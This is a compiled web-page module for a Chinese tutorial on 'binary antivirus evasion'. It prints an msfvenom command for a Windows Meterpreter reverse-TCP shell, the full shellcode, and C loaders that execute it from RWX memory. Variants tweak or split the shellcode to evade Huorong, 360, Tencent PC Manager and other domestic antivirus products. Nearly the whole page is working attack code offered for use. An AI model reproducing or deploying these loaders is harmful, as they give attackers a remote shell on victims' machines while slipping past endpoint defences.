import{_ as i,K as n,L as d,a5 as c,M as x,N as s,W as u,F as a}from"./framework-edebdfe1.js";const l={},v=x("h1",{id:"二进制免杀",tabindex:"-1"},[x("a",{class:"header-anchor",href:"#二进制免杀","aria-hidden":"true"},"#"),s(" 二进制免杀")],-1),b=x("div",{class:"hint-container warning"},[x("p",{class:"hint-container-title"},"DeeLMind 提示"),x("p",null,"二进制免杀最好基于源码免杀")],-1),t=u(`<h2 id="病毒代码" tabindex="-1"><a class="header-anchor" href="#病毒代码" aria-hidden="true">#</a> 病毒代码</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.21 lport=4444 -f c

unsigned char buf[] =
&quot;\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xcc\\x00\\x00\\x00\\x41\\x51\\x41\\x50\\x52&quot;
&quot;\\x51\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\\x18\\x56\\x48&quot;
&quot;\\x8b\\x52\\x20\\x4d\\x31\\xc9\\x48\\x8b\\x72\\x50\\x48\\x0f\\xb7\\x4a\\x4a&quot;
&quot;\\x48\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\\xc1\\xc9\\x0d\\x41&quot;

&quot;\\x01\\xc1\\xe2\\xed\\x52\\x48\\x8b\\x52\\x20\\x8b\\x42\\x3c\\x48\\x01\\xd0&quot;

&quot;\\x41\\x51\\x66\\x81\\x78\\x18\\x0b\\x02\\x0f\\x85\\x72\\x00\\x00\\x00\\x8b&quot;
&quot;\\x80\\x88\\x00\\x00\\x00\\x48\\x85\\xc0\\x74\\x67\\x48\\x01\\xd0\\x8b\\x48&quot;
&quot;\\x18\\x50\\x44\\x8b\\x40\\x20\\x49\\x01\\xd0\\xe3\\x56\\x4d\\x31\\xc9\\x48&quot;
&quot;\\xff\\xc9\\x41\\x8b\\x34\\x88\\x48\\x01\\xd6\\x48\\x31\\xc0\\xac\\x41\\xc1&quot;
&quot;\\xc9\\x0d\\x41\\x01\\xc1\\x38\\xe0\\x75\\xf1\\x4c\\x03\\x4c\\x24\\x08\\x45&quot;
&quot;\\x39\\xd1\\x75\\xd8\\x58\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x41\\x8b&quot;
&quot;\\x0c\\x48\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x41\\x8b\\x04\\x88\\x48\\x01&quot;
&quot;\\xd0\\x41\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\\x41\\x59\\x41\\x5a\\x48&quot;
&quot;\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\\x59\\x5a\\x48\\x8b\\x12\\xe9&quot;
&quot;\\x4b\\xff\\xff\\xff\\x5d\\x49\\xbe\\x77\\x73\\x32\\x5f\\x33\\x32\\x00\\x00&quot;
&quot;\\x41\\x56\\x49\\x89\\xe6\\x48\\x81\\xec\\xa0\\x01\\x00\\x00\\x49\\x89\\xe5&quot;
&quot;\\x49\\xbc\\x02\\x00\\x11\\x5c\\xc0\\xa8\\x01\\x15\\x41\\x54\\x49\\x89\\xe4&quot;
&quot;\\x4c\\x89\\xf1\\x41\\xba\\x4c\\x77\\x26\\x07\\xff\\xd5\\x4c\\x89\\xea\\x68&quot;
&quot;\\x01\\x01\\x00\\x00\\x59\\x41\\xba\\x29\\x80\\x6b\\x00\\xff\\xd5\\x6a\\x0a&quot;
&quot;\\x41\\x5e\\x50\\x50\\x4d\\x31\\xc9\\x4d\\x31\\xc0\\x48\\xff\\xc0\\x48\\x89&quot;
&quot;\\xc2\\x48\\xff\\xc0\\x48\\x89\\xc1\\x41\\xba\\xea\\x0f\\xdf\\xe0\\xff\\xd5&quot;
&quot;\\x48\\x89\\xc7\\x6a\\x10\\x41\\x58\\x4c\\x89\\xe2\\x48\\x89\\xf9\\x41\\xba&quot;
&quot;\\x99\\xa5\\x74\\x61\\xff\\xd5\\x85\\xc0\\x74\\x0a\\x49\\xff\\xce\\x75\\xe5&quot;
&quot;\\xe8\\x93\\x00\\x00\\x00\\x48\\x83\\xec\\x10\\x48\\x89\\xe2\\x4d\\x31\\xc9&quot;
&quot;\\x6a\\x04\\x41\\x58\\x48\\x89\\xf9\\x41\\xba\\x02\\xd9\\xc8\\x5f\\xff\\xd5&quot;
&quot;\\x83\\xf8\\x00\\x7e\\x55\\x48\\x83\\xc4\\x20\\x5e\\x89\\xf6\\x6a\\x40\\x41&quot;
&quot;\\x59\\x68\\x00\\x10\\x00\\x00\\x41\\x58\\x48\\x89\\xf2\\x48\\x31\\xc9\\x41&quot;
&quot;\\xba\\x58\\xa4\\x53\\xe5\\xff\\xd5\\x48\\x89\\xc3\\x49\\x89\\xc7\\x4d\\x31&quot;
&quot;\\xc9\\x49\\x89\\xf0\\x48\\x89\\xda\\x48\\x89\\xf9\\x41\\xba\\x02\\xd9\\xc8&quot;
&quot;\\x5f\\xff\\xd5\\x83\\xf8\\x00\\x7d\\x28\\x58\\x41\\x57\\x59\\x68\\x00\\x40&quot;
&quot;\\x00\\x00\\x41\\x58\\x6a\\x00\\x5a\\x41\\xba\\x0b\\x2f\\x0f\\x30\\xff\\xd5&quot;
&quot;\\x57\\x59\\x41\\xba\\x75\\x6e\\x4d\\x61\\xff\\xd5\\x49\\xff\\xce\\xe9\\x3c&quot;
&quot;\\xff\\xff\\xff\\x48\\x01\\xc3\\x48\\x29\\xc6\\x48\\x85\\xf6\\x75\\xb4\\x41&quot;
&quot;\\xff\\xe7\\x58\\x6a\\x00\\x59\\x49\\xc7\\xc2\\xf0\\xb5\\xa2\\x56\\xff\\xd5&quot;;


int main(int argc, char** argv) {
    void* exec = VirtualAlloc(0, sizeof(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, buf, sizeof(buf));
    ((void(*)())exec)();

    return 0;
}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="火绒免杀" tabindex="-1"><a class="header-anchor" href="#火绒免杀" aria-hidden="true">#</a> 火绒免杀</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>void encrypt(char * buf) {
    char key = 0x1;
    buf[63] -= key;
}

int main(int argc, char** argv) {
    encrypt((char*)buf);
    void* exec = VirtualAlloc(0, sizeof(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, buf, sizeof(buf));
    ((void(*)())exec)();

    return 0;
}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="_360免杀" tabindex="-1"><a class="header-anchor" href="#_360免杀" aria-hidden="true">#</a> 360免杀</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>unsigned char buf[] =
&quot;\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xcc\\x00\\x00\\x00\\x41\\x51\\x41\\x50\\x52&quot;
&quot;\\x51\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\\x18\\x56\\x48&quot;
&quot;\\x8b\\x52\\x20\\x4d\\x31\\xc9\\x48\\x8b\\x72\\x50\\x48\\x0f\\xb7\\x4a\\x4a&quot;
&quot;\\x48\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\\xc1\\xc9\\x0d\\x41&quot;
&quot;\\x01\\xc1\\xe2\\xed\\x52\\x48\\x8b\\x52\\x20\\x8b\\x42\\x3c\\x48\\x01\\xd0&quot;
&quot;\\x41\\x51\\x66\\x81\\x78\\x18\\x0b\\x02\\x0f\\x85\\x72\\x00\\x00\\x00\\x8b&quot;
&quot;\\x80\\x88\\x00\\x00\\x00\\x48\\x85\\xc0\\x74\\x67\\x48\\x01\\xd0\\x8b\\x48&quot;
&quot;\\x18\\x50\\x44\\x8b\\x40\\x20\\x49\\x01\\xd0\\xe3\\x56\\x4d\\x31\\xc9\\x48&quot;
&quot;\\xff\\xc9\\x41\\x8b\\x34\\x88\\x48\\x01\\xd6\\x48\\x31\\xc0\\xac\\x41\\xc1&quot;
&quot;\\xc9\\x0d\\x41\\x01\\xc1\\x38\\xe0\\x75\\xf1\\x4c\\x03\\x4c\\x24\\x08\\x45&quot;
&quot;\\x39\\xd1\\x75\\xd8\\x58\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x41\\x8b&quot;
&quot;\\x0c\\x48\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x41\\x8b\\x04\\x88\\x48\\x01&quot;
&quot;\\xd0\\x41\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\\x41\\x59\\x41\\x5a\\x48&quot;
&quot;\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\\x59\\x5a\\x48\\x8b\\x12\\xe9&quot;
&quot;\\x4b\\xff\\xff\\xff\\x5d\\x49\\xbe\\x77\\x73\\x32\\x5f\\x33\\x32\\x00\\x00&quot;
&quot;\\x41\\x56\\x49\\x89\\xe6\\x48\\x81\\xec\\xa0\\x01\\x00\\x00\\x49\\x89\\xe5&quot;
&quot;\\x49\\xbc\\x02\\x00\\x11\\x5c\\xc0\\xa8\\x01\\x15\\x41\\x54\\x49\\x89\\xe4&quot;
&quot;\\x4c\\x89\\xf1\\x41\\xba\\x4c\\x77\\x26\\x07\\xff\\xd5\\x4c\\x89\\xea\\x68&quot;
&quot;\\x01\\x01\\x00\\x00\\x59\\x41\\xba\\x29\\x80\\x6b\\x00\\xff\\xd5\\x6a\\x0a&quot;
&quot;\\x41\\x5e\\x50\\x50\\x4d\\x31\\xc9\\x4d\\x31\\xc0\\x48\\xff\\xc0\\x48\\x89&quot;
&quot;\\xc2\\x48\\xff\\xc0\\x48\\x89\\xc1\\x41\\xba\\xea\\x0f\\xdf\\xe0\\xff\\xd5&quot;
&quot;\\x48\\x89\\xc7\\x6a\\x10\\x41\\x58\\x4c\\x89\\xe2\\x48\\x89\\xf9\\x41\\xba&quot;
&quot;\\x99\\xa5\\x74\\x61\\xff\\xd5\\x85\\xc0\\x74\\x0a\\x49\\xff\\xce\\x75\\xe5&quot;
&quot;\\xe8\\x93\\x00\\x00\\x00\\x48\\x83\\xec\\x10\\x48\\x89\\xe2\\x4d\\x31\\xc9&quot;
&quot;\\x6a\\x04\\x41\\x58\\x48\\x89\\xf9\\x41\\xba\\x02\\xd9\\xc8\\x5f\\xff\\xd5&quot;
&quot;\\x83\\xf8\\x00\\x7e\\x55\\x48\\x83\\xc4\\x20\\x5e\\x89\\xf6\\x6a\\x40\\x41&quot;
&quot;\\x59\\x68\\x00\\x10\\x00\\x00\\x41\\x58\\x48\\x89\\xf2\\x48\\x31\\xc9\\x41&quot;
&quot;\\xba\\x58\\xa4\\x53\\xe5\\xff\\xd5\\x48\\x89\\xc3\\x49\\x89\\xc7\\x4d\\x31&quot;
&quot;\\xc9\\x49\\x89\\xf0\\x48\\x89\\xda\\x48\\x89\\xf9\\x41\\xba\\x02\\xd9\\xc8&quot;;

unsigned char end[] = &quot;\\x00\\x00\\x41\\x58\\x6a\\x00\\x5a\\x41\\xba\\x0b\\x2f\\x0f\\x30\\xff\\xd5&quot;
&quot;\\x57\\x59\\x41\\xba\\x75\\x6e\\x4d\\x61\\xff\\xd5\\x49\\xff\\xce\\xe9\\x3c&quot;
&quot;\\xff\\xff\\xff\\x48\\x01\\xc3\\x48\\x29\\xc6\\x48\\x85\\xf6\\x75\\xb4\\x41&quot;
&quot;\\xff\\xe7\\x58\\x6a\\x00\\x59\\x49\\xc7\\xc2\\xf0\\xb5\\xa2\\x56\\xff\\xd5&quot;;

unsigned char bypass[] = &quot;\\x5f\\xff\\xd5\\x83\\xf8\\x00\\x7d\\x28\\x58\\x41\\x57\\x59\\x68\\x00\\x40&quot;;

int main(int argc, char** argv) {
    printf(&quot;test&quot;);
    void* exec = VirtualAlloc(0, 510, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    memcpy(exec, buf, sizeof(buf));

    char * exec1 = (char *)exec + sizeof(buf) - 1;

    memcpy((char *)exec1, bypass, sizeof(bypass));

    char* exec2 = (char*)exec1 + sizeof(bypass) - 1;

    memcpy((char*)exec2, end, sizeof(end));

    ((void(*)())exec)();

    return 0;
}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="q管免杀" tabindex="-1"><a class="header-anchor" href="#q管免杀" aria-hidden="true">#</a> Q管免杀</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>unsigned char buf[] =
&quot;\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xcc\\x00\\x00\\x00\\x41\\x51\\x41\\x50\\x52&quot;
&quot;\\x51\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\\x18\\x56\\x48&quot;
&quot;\\x8b\\x52\\x20\\x4d\\x31\\xc9\\x48\\x8b\\x72\\x50\\x48\\x0f\\xb7\\x4a\\x4a&quot;
&quot;\\x48\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\\xc1\\xc9\\x0d\\x41&quot;
&quot;\\x01\\xc1\\xe2\\xed\\x52\\x48\\x8b\\x52\\x20\\x8b\\x42\\x3c\\x48\\x01\\xd0&quot;
&quot;\\x41\\x51\\x66\\x81\\x78\\x18\\x0b\\x02\\x0f\\x85\\x72\\x00\\x00\\x00\\x8b&quot;
&quot;\\x80\\x88\\x00\\x00\\x00\\x48\\x85\\xc0\\x74\\x67\\x48\\x01\\xd0\\x8b\\x48&quot;
&quot;\\x18\\x50\\x44\\x8b\\x40\\x20\\x49\\x01\\xd0\\xe3\\x56\\x4d\\x31\\xc9\\x48&quot;
&quot;\\xff\\xc9\\x41\\x8b\\x34\\x88\\x48\\x01\\xd6\\x48\\x31\\xc0\\xac\\x41\\xc1&quot;
&quot;\\xc9\\x0d\\x41\\x01\\xc1\\x38\\xe0\\x75\\xf1\\x4c\\x03\\x4c\\x24\\x08\\x45&quot;
&quot;\\x39\\xd1\\x75\\xd8\\x58\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x41\\x8b&quot;
&quot;\\x0c\\x48\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x41\\x8b\\x04\\x88\\x48\\x01&quot;
&quot;\\xd0\\x41\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\\x41\\x59\\x41\\x5a\\x48&quot;
&quot;\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\\x59\\x5a\\x48\\x8b\\x12\\xe9&quot;
&quot;\\x4b\\xff\\xff\\xff\\x5d\\x49\\xbe\\x77\\x73\\x32\\x5f\\x33\\x32\\x00\\x00&quot;
&quot;\\x41\\x56\\x49\\x89\\xe6\\x48\\x81\\xec\\xa0\\x01\\x00\\x00\\x49\\x89\\xe5&quot;
&quot;\\x49\\xbc\\x02\\x00\\x11\\x5c\\xc0\\xa8\\x01\\x15\\x41\\x54\\x49\\x89\\xe4&quot;
&quot;\\x4c\\x89\\xf1\\x41\\xba\\x4c\\x77\\x26\\x07\\xff\\xd5\\x4c\\x89\\xea\\x68&quot;
&quot;\\x01\\x01\\x00\\x00\\x59\\x41\\xba\\x29\\x80\\x6b\\x00\\xff\\xd5\\x6a\\x0a&quot;
&quot;\\x41\\x5e\\x50\\x50\\x4d\\x31\\xc9\\x4d\\x31\\xc0\\x48\\xff\\xc0\\x48\\x89&quot;
&quot;\\xc2\\x48\\xff\\xc0\\x48\\x89\\xc1\\x41\\xba\\xea\\x0f\\xdf\\xe0\\xff\\xd5&quot;
&quot;\\x48\\x89\\xc7\\x6a\\x10\\x41\\x58\\x4c\\x89\\xe2\\x48\\x89\\xf9\\x41\\xba&quot;
&quot;\\x99\\xa5\\x74\\x61\\xff\\xd5\\x85\\xc0\\x74\\x0a\\x49\\xff\\xce\\x75\\xe5&quot;
&quot;\\xe8\\x93\\x00\\x00\\x00\\x48\\x83\\xec\\x10\\x48\\x89\\xe2\\x4d\\x31\\xc9&quot;
&quot;\\x6a\\x04\\x41\\x58\\x48\\x89\\xf9\\x41\\xba\\x02\\xd9\\xc8\\x5f\\xff\\xd5&quot;
&quot;\\x83\\xf8\\x00\\x7e\\x55\\x48\\x83\\xc4\\x20\\x5e\\x89\\xf6\\x6a\\x40\\x41&quot;
&quot;\\x59\\x68\\x00\\x10\\x00\\x00\\x41\\x58\\x48\\x89\\xf2\\x48\\x31\\xc9\\x41&quot;
&quot;\\xba\\x58\\xa4\\x53\\xe5\\xff\\xd5\\x48\\x89\\xc3\\x49\\x89\\xc7\\x4d\\x31&quot;
&quot;\\xc9\\x49\\x89\\xf0\\x48\\x89\\xda\\x48\\x89\\xf9\\x41\\xba\\x02\\xd9\\xc8&quot;;

unsigned char end[] = &quot;\\x00\\x00\\x41\\x58\\x6a\\x00\\x5a\\x41\\xba\\x0b\\x2f\\x0f\\x30\\xff\\xd5&quot;
&quot;\\x57\\x59\\x41\\xba\\x75\\x6e\\x4d\\x61\\xff\\xd5\\x49\\xff\\xce\\xe9\\x3c&quot;
&quot;\\xff\\xff\\xff\\x48\\x01\\xc3\\x48\\x29\\xc6\\x48\\x85\\xf6\\x75\\xb4\\x41&quot;
&quot;\\xff\\xe7\\x58\\x6a\\x00\\x59\\x49\\xc7\\xc2\\xf0\\xb5\\xa2\\x56\\xff\\xd5&quot;;

unsigned char bypass[] = &quot;\\x5f\\xff\\xd5\\x83\\xf8\\x00\\x7d\\x28\\x58\\x41\\x57\\x59\\x68\\x00\\x40&quot;;

int main(int argc, char** argv) {
    printf(&quot;test&quot;);
    void* exec = VirtualAlloc(0, 510, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    memcpy(exec, buf, sizeof(buf));

    char * exec1 = (char *)exec + sizeof(buf) - 1;

    memcpy((char *)exec1, bypass, sizeof(bypass));

    char* exec2 = (char*)exec1 + sizeof(bypass) - 1;

    memcpy((char*)exec2, end, sizeof(end));

    ((void(*)())exec)();

    return 0;
}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="金山免杀" tabindex="-1"><a class="header-anchor" href="#金山免杀" aria-hidden="true">#</a> 金山免杀</h2><p><code>MSF生成无需免杀，本身就不杀</code></p><h2 id="国内通杀" tabindex="-1"><a class="header-anchor" href="#国内通杀" aria-hidden="true">#</a> 国内通杀</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>#include &lt;iostream&gt;
#include&lt;Windows.h&gt;
#include&lt;string&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;


unsigned char buf[] =
&quot;\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xcc\\x00\\x00\\x00\\x41\\x51\\x41\\x50\\x52&quot;
&quot;\\x51\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\\x18\\x56\\x48&quot;
&quot;\\x8b\\x52\\x20\\x4d\\x31\\xc9\\x48\\x8b\\x72\\x50\\x48\\x0f\\xb7\\x4a\\x4a&quot;
&quot;\\x48\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\\xc1\\xc9\\x0d\\x41&quot;
&quot;\\x01\\xc1\\xe2\\xef\\x52\\x48\\x8b\\x52\\x20\\x8b\\x42\\x3c\\x48\\x01\\xd0&quot;
&quot;\\x41\\x51\\x66\\x81\\x78\\x18\\x0b\\x02\\x0f\\x85\\x72\\x00\\x00\\x00\\x8b&quot;
&quot;\\x80\\x88\\x00\\x00\\x00\\x48\\x85\\xc0\\x74\\x67\\x48\\x01\\xd0\\x8b\\x48&quot;
&quot;\\x18\\x50\\x44\\x8b\\x40\\x20\\x49\\x01\\xd0\\xe3\\x56\\x4d\\x31\\xc9\\x48&quot;
&quot;\\xff\\xc9\\x41\\x8b\\x34\\x88\\x48\\x01\\xd6\\x48\\x31\\xc0\\xac\\x41\\xc1&quot;
&quot;\\xc9\\x0d\\x41\\x01\\xc1\\x38\\xe0\\x75\\xf1\\x4c\\x03\\x4c\\x24\\x08\\x45&quot;
&quot;\\x39\\xd1\\x75\\xd8\\x58\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x41\\x8b&quot;
&quot;\\x0c\\x48\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x41\\x8b\\x04\\x88\\x48\\x01&quot;
&quot;\\xd0\\x41\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\\x41\\x59\\x41\\x5a\\x48&quot;
&quot;\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\\x59\\x5a\\x48\\x8b\\x12\\xe9&quot;
&quot;\\x4b\\xff\\xff\\xff\\x5d\\x49\\xbe\\x77\\x73\\x32\\x5f\\x33\\x32\\x00\\x00&quot;
&quot;\\x41\\x56\\x49\\x89\\xe6\\x48\\x81\\xec\\xa0\\x01\\x00\\x00\\x49\\x89\\xe5&quot;
&quot;\\x49\\xbc\\x02\\x00\\x11\\x5c\\xc0\\xa8\\x01\\x15\\x41\\x54\\x49\\x89\\xe4&quot;
&quot;\\x4c\\x89\\xf1\\x41\\xba\\x4c\\x77\\x26\\x07\\xff\\xd5\\x4c\\x89\\xea\\x68&quot;
&quot;\\x01\\x01\\x00\\x00\\x59\\x41\\xba\\x29\\x80\\x6b\\x00\\xff\\xd5\\x6a\\x0a&quot;
&quot;\\x41\\x5e\\x50\\x50\\x4d\\x31\\xc9\\x4d\\x31\\xc0\\x48\\xff\\xc0\\x48\\x89&quot;
&quot;\\xc2\\x48\\xff\\xc0\\x48\\x89\\xc1\\x41\\xba\\xea\\x0f\\xdf\\xe0\\xff\\xd5&quot;
&quot;\\x48\\x89\\xc7\\x6a\\x10\\x41\\x58\\x4c\\x89\\xe2\\x48\\x89\\xf9\\x41\\xba&quot;
&quot;\\x99\\xa5\\x74\\x61\\xff\\xd5\\x85\\xc0\\x74\\x0a\\x49\\xff\\xce\\x75\\xe5&quot;
&quot;\\xe8\\x93\\x00\\x00\\x00\\x48\\x83\\xec\\x10\\x48\\x89\\xe2\\x4d\\x31\\xc9&quot;
&quot;\\x6a\\x04\\x41\\x58\\x48\\x89\\xf9\\x41\\xba\\x02\\xd9\\xc8\\x5f\\xff\\xd5&quot;
&quot;\\x83\\xf8\\x00\\x7e\\x55\\x48\\x83\\xc4\\x20\\x5e\\x89\\xf6\\x6a\\x40\\x41&quot;
&quot;\\x59\\x68\\x00\\x10\\x00\\x00\\x41\\x58\\x48\\x89\\xf2\\x48\\x31\\xc9\\x41&quot;
&quot;\\xba\\x58\\xa4\\x53\\xe5\\xff\\xd5\\x48\\x89\\xc3\\x49\\x89\\xc7\\x4d\\x31&quot;
&quot;\\xc9\\x49\\x89\\xf0\\x48\\x89\\xda\\x48\\x89\\xf9\\x41\\xba\\x02\\xd9\\xc8&quot;;

unsigned char end[] = &quot;\\x00\\x00\\x41\\x58\\x6a\\x00\\x5a\\x41\\xba\\x0b\\x2f\\x0f\\x30\\xff\\xd5&quot;
&quot;\\x57\\x59\\x41\\xba\\x75\\x6e\\x4d\\x61\\xff\\xd5\\x49\\xff\\xce\\xe9\\x3c&quot;
&quot;\\xff\\xff\\xff\\x48\\x01\\xc3\\x48\\x29\\xc6\\x48\\x85\\xf6\\x75\\xb4\\x41&quot;
&quot;\\xff\\xe7\\x58\\x6a\\x00\\x59\\x49\\xc7\\xc2\\xf0\\xb5\\xa2\\x56\\xff\\xd5&quot;;

unsigned char bypass[] = &quot;\\x5f\\xff\\xd5\\x83\\xf8\\x00\\x7d\\x28\\x58\\x41\\x57\\x59\\x68\\x00\\x40&quot;;

void encrypt(char * buf) {
    char key = 0x1;
    buf[63] -= key;
}

int main(int argc, char** argv) {
    encrypt((char*)buf);
    void* exec = VirtualAlloc(0, 510, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    memcpy(exec, buf, sizeof(buf));

    char * exec1 = (char *)exec + sizeof(buf)-1;

    memcpy((char *)exec1, bypass, sizeof(bypass));

    char* exec2 = (char*)exec1 + sizeof(bypass) - 1;

    memcpy((char*)exec2, end, sizeof(end));

    ((void(*)())exec)();

    return 0;
}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,12);function r(o,f){const e=a("DocsAD");return n(),d("div",null,[v,b,c(e),t])}const q=i(l,[["render",r],["__file","bin.html.vue"]]);export{q as default};
